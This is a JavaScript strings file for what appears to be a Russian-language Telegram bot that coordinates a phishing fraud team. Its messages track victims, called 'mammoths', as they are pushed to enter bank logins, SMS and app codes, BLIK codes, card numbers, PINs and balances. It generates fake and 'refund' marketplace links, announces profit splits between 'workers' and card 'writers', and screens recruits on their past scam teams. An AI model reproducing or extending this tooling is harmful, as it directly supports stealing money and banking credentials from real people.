module.exports = {
  statuses: {
    sms: "📤 SMS",
    lk: "🏦 ЛК",
    push: "📲 PUSH",
    oncard: "🔐 НА карту",
    offcard: "🔐 НА лк",
    dep: "💸 ПОПОЛНЕНИЕ",
    blik: "#️⃣ БЛИК",
    appCode: "📬 Код из приложения",
    callCode: "📞 Код из звонка",
    picture: "🖼 КАРТИНКА",
    limits: "⚠️ ЛИМИТЫ",
    otherCard: "💳 СМЕНА",
    correctBalance: "💰 ТОЧНЫЙ БАЛАНС",
    workerCorrectBalance: "💰 ТОЧНЫЙ БАЛАНС",
    forVerify: "⚠️ НУЖЕН БАЛАНС",
    pincode: "🔐 PIN-CODE",
    myeror: "БЕЗ ПОЛЯ",
    myerorfield: "С ПОЛЕМ",
    scream: "😱 Скример",
    prozvon: "📞 ПРОЗВОН",
    card: "💳 Перевести на КАРТУ",
    fakeLk: "❌ Неверный ЛК",
    otherLk: "🔄 СМЕНА ЛК",
  },
  workerStatuses: {
    otherLk: "🔄 Вашего мамонта отправили на СМЕНУ ЛК",

    fakeLk: "❌ Ваш мамонт ввёл неверные данные от ЛК",

    card: "💳 Вашего мамонта отправили на ВВОД КАРТЫ",
    push: "📲 Вашему мамонту отправили ПУШ",
    dep: "💸 Вашего мамонта отправили на пополнения карты",
    scream: "😱 Вашего мамонта отправили на скример",
    oncard: "🔐 Вашего мамонта отправили на карту",
    offcard: "🔐 Вашего мамонта отправили на лк",
    sms: "📤 Вашему мамонту отправили СМС-КОД",
    lk: "🏦 Вашего мамонта отправили на ЛК",
    blik: "📤 Вашему мамонту отправили БЛИК",
    callCode: "☎️ Вашему мамонту отправили звонок с кодом",
    appCode: "📬 Вашему мамонту отправили код в приложение",
    picture: "🖼 Вашему мамонту отправили картинку",
    limits: "⚠️ Ваш мамонт должен поднять лимиты",
    otherCard: "💳 Ваш мамонт должен ввести другую карту",
    forVerify: "⚠️ У вашего мамонта должен быть баланс на карте",
    correctBalance: "💰 Ваш мамонт должен ввести точный баланс",
    pincode: "🔐 Ваш мамонт должен ввести ПИН-код",
  },
  wrongWorkerStatuses: {
    code: "❌ Ваш мамонт ввёл неверный КОД",
    lk: "❌ Ваш мамонт ввёл неверные данные от ЛК",
    picture: "❌ Ваш мамонт выбрал неверную КАРТИНКУ",
    push: "❌ Ваш мамонт не подтверждает ПУШ",
  },

  newProfit: {
    channel: `<b>💰 НОВЫЙ ПРОФИТ {serviceTitle}</b>
💸 Сумма:<b>{amount}</b>
💴 Процент воркера: <b>{workerAmount}</b>
👤 Воркер: <b>{worker}</b>
✍️ Вбивер: <b>{writer}</b>{mentor}{operator}{bin}<b>{mailer}</b><b>{mailer2}</b><b>{mailer3}</b><b>{mailer4}</b><b>{mailer5}</b><b>{mailer6}</b><b>{mailer7}</b><b>{mailer8}</b><b>{mailer9}</b><b>{sms}</b><b>{sms2}</b><b>{sms3}</b><b>{screen}</b><b>{screen2}</b><b>{screen3}</b><b>{screen4}</b>{call}`,
    wait: "⏳ Ожидание выплаты",
    payed: "✅ Выплачено",
    razvitie: "🌎 На развитие",
    lok: "❌ Лок",

    worker: `<b>🎉 Вам засчитан профит #{profitId} в размере {amount}</b>
💰 Ваш процент: <b>{workerAmount}</b>
👨‍💻 Вбивер → <b>{writer}</b>

<i>{wallet_profit}</i>`,
  },
  myAd: {
    text: `<b>{service}</b> | <code>{id}</code> | <b>#id{id}</b>

🏷 Название: <b>{title}</b>
🏡 Адрес доставки: <b>{address}</b>
👤 Имя: <b>{name}</b>
💰 Цена: <b>{price}</b>
💳 Чекер: <b>{balanceChecker}</b>
⛓️‍💥 Мультиссылка: <b>{billingStatus}</b> 

🔗 Оригинальная ссылка: {adLinkDisplay}

🔗 Фейк-ссылка: <a href="{fakeLinkUrl}">Перейти</a>
╰ <code>{fakeLinkUrl}</code>

↩️ Ссылка возврата: <a href="{refundLinkUrl}">Перейти</a>
╰ <code>{refundLinkUrl}</code>

✂️ Сокращённая ссылка: {shortLinkDisplay}

🌐 Личный домен: {personalLinkDisplay}
`,
  },
  now_writers: "✍️ Сейчас на вбиве:",
  chat_list: "💬 Список чатов",
  payouts: "📢 Канал выплат",
  workers: "💬 Чат воркеров",
  top_workers: "🏆 Топ воркеров",
  top_null: "В топе пусто, у тебя есть шанс стать первым",
  mainMenu: {
    text: `
👤 ID: <code>{id}</code> | <b>{tag}</b>
🪪 Статус(ы): <b>{status}</b>  
💳 Карт заведено: <b>{logs_count}</b>  
💵 Профиты: <b>{profitlogs_count}</b> / <b>{profits_sum}</b> | <b>{monthly_count}</b> / <b>{monthly_sum}</b>
⚖️ Процент: <b>{payoutPercent}%</b>  

{work}
`,

    buttons: {
      create_link: "🔗 Создать объявление",
      my_ads: "📂 Объявления",
      my_profits: "💸 Мои профиты",
      workers_top: "🥇 Топ исполнителей",
      writer: "✍️ Активные вбивы",
      settings: "⚙️ Настройки",
      chats: "💬 Обсуждения",
      teachers: "🎓 Наставники",
      info: "ℹ️ Информация",
      send_sms: "📲 Отправка СМС",
      parse: "🕵️‍♂️ Спарсить объявления",
      my_parsings: "📂 Мои парсинги",
    },
  },
  choose_country: "🌎 Выберите страну",
  choose_service: "📦 Выберите сервис",
  go_to_menu: "◀️ В главное меню",
  go_back: "◀️ Назад",
  roles: {
    admin: "Администратор",
    writer: "Вбивер",
    worker: "Воркер",
    pro: "Профи",
    nastavnik: "Наставник",
    operator: "Оператор",
  },
  requests: {
    need_send_request: `<b>Приветствуем, {name}!</b>
      
<i>Для использования бота необходимо подать заявку. Вы готовы?</i>`,
    ready_send_button: "✅ Я готов!",
    wait_request_process: "⏳ Ожидайте рассмотрения вашей заявки",
    done: "✅ Заявка отправлена на рассмотрение, ожидайте.",
    accepted: "🎉 Поздравляем, ваша заявка принята!",
    declined: "😞 Ваша заявка была отклонена",
    steps: [
      {
        request_text: "Команды в которых работал",
        scene_text: `

<b>1️⃣ В каких командах работал ранее?</b>`,
      },
      {
        request_text: "Сумма профитов",
        scene_text: `

<b>2️⃣ Общая сумма профитов?</b>`,
        ready_send_button: "Назад",
      },
      {
        request_text: "Откуда узнал",
        scene_text: `

<b>3️⃣ Откуда узнал о команде?</b>

<i>Если вас пригласил друг, укажите его @username:</i>`,
      },
    ],
  },
  your_account_banned: "❌ Ваш аккаунт заблокировали",
  newChatMemberText: "👋 Приветствуем в нашем чате, {username}!",
};
